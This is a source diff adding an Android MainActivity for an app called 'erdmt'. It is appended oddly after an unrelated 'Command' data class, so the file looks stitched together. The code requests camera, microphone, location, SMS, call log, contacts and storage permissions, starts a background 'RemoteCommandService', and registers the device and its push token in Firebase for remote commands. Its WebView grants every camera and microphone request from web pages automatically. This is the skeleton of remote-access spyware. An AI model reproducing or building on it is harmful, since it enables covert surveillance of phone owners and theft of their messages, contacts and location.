@@ -632,3 +632,198 @@ data class Command(
     val timestamp: Long = 0,
     val sender: String = ""
 )
+package com.yourdomain.erdmt
+
+import android.Manifest
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
+import android.os.Bundle
+import android.provider.Settings
+import android.webkit.*
+import android.widget.Button
+import android.widget.TextView
+import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.content.ContextCompat
+import com.google.firebase.FirebaseApp
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.messaging.FirebaseMessaging
+import java.util.*
+
+class MainActivity : AppCompatActivity() {
+    private lateinit var webView: WebView
+    private lateinit var permissionStatus: TextView
+    private lateinit var deviceId: String
+    private lateinit var database: FirebaseDatabase
+    
+    companion object {
+        private val ALL_PERMISSIONS = arrayOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE
+        )
+    }
+    
+    private val requestPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) { permissions ->
+        updatePermissionStatus()
+        val allGranted = permissions.values.all { it }
+        if (allGranted) {
+            Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show()
+        } else {
+            Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show()
+        }
+    }
+    
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+        
+        initializeFirebase()
+        initializeViews()
+        requestPermissions()
+        startBackgroundService()
+        registerDevice()
+    }
+    
+    private fun initializeFirebase() {
+        if (FirebaseApp.getApps(this).isEmpty()) {
+            FirebaseApp.initializeApp(this)
+        }
+        database = FirebaseDatabase.getInstance()
+        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        
+        // Get FCM token
+        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+            if (!task.isSuccessful) {
+                return@addOnCompleteListener
+            }
+            val token = task.result
+            registerDeviceWithToken(token)
+        }
+    }
+    
+    private fun initializeViews() {
+        webView = findViewById(R.id.webView)
+        permissionStatus = findViewById(R.id.permissionStatus)
+        
+        val refreshButton: Button = findViewById(R.id.refreshButton)
+        val requestPermissionsButton: Button = findViewById(R.id.requestPermissionsButton)
+        
+        refreshButton.setOnClickListener { webView.reload() }
+        requestPermissionsButton.setOnClickListener { requestPermissions() }
+        
+        setupWebView()
+        updatePermissionStatus()
+    }
+    
+    private fun requestPermissions() {
+        val permissionsToRequest = ALL_PERMISSIONS.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }.toTypedArray()
+        
+        if (permissionsToRequest.isNotEmpty()) {
+            requestPermissionLauncher.launch(permissionsToRequest)
+        }
+    }
+    
+    private fun updatePermissionStatus() {
+        val grantedCount = ALL_PERMISSIONS.count { 
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
+        }
+        
+        permissionStatus.text = "Permissions: $grantedCount/${ALL_PERMISSIONS.size} granted"
+        
+        if (grantedCount == ALL_PERMISSIONS.size) {
+            permissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
+        } else {
+            permissionStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
+        }
+    }
+    
+    @Suppress("SetJavaScriptEnabled")
+    private fun setupWebView() {
+        webView.settings.apply {
+            javaScriptEnabled = true
+            domStorageEnabled = true
+            allowFileAccess = true
+            allowContentAccess = true
+            loadWithOverviewMode = true
+            useWideViewPort = true
+            mediaPlaybackRequiresUserGesture = false
+            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+        }
+        
+        webView.webViewClient = WebViewClient()
+        webView.webChromeClient = object : WebChromeClient() {
+            override fun onPermissionRequest(request: PermissionRequest?) {
+                runOnUiThread {
+                    request?.grant(request.resources)
+                }
+            }
+        }
+        
+        webView.loadUrl("https://www.google.com")
+    }
+    
+    private fun registerDevice() {
+        val deviceInfo = mapOf(
+            "id" to deviceId,
+            "model" to Build.MODEL,
+            "manufacturer" to Build.MANUFACTURER,
+            "version" to Build.VERSION.RELEASE,
+            "online" to true,
+            "lastSeen" to System.currentTimeMillis(),
+            "permissions" to getGrantedPermissions(),
+            "battery" to getBatteryLevel()
+        )
+        
+        database.reference.child("devices").child(deviceId).setValue(deviceInfo)
+    }
+    
+    private fun registerDeviceWithToken(token: String) {
+        database.reference.child("devices").child(deviceId).child("fcmToken").setValue(token)
+    }
+    
+    private fun startBackgroundService() {
+        val serviceIntent = Intent(this, RemoteCommandService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+    }
+    
+    private fun getBatteryLevel(): Int {
+        val batteryManager = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
+        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+    }
+    
+    private fun getGrantedPermissions(): List<String> {
+        return ALL_PERMISSIONS.filter { 
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
+        }
+    }
+    
+    override fun onBackPressed() {
+        if (webView.canGoBack()) {
+            webView.goBack()
+        } else {
+            super.onBackPressed()
+        }
+    }
+    
+    override fun onDestroy() {
+        super.onDestroy()
+        database.reference.child("devices").child(deviceId).child("online").setValue(false)
+    }
+}
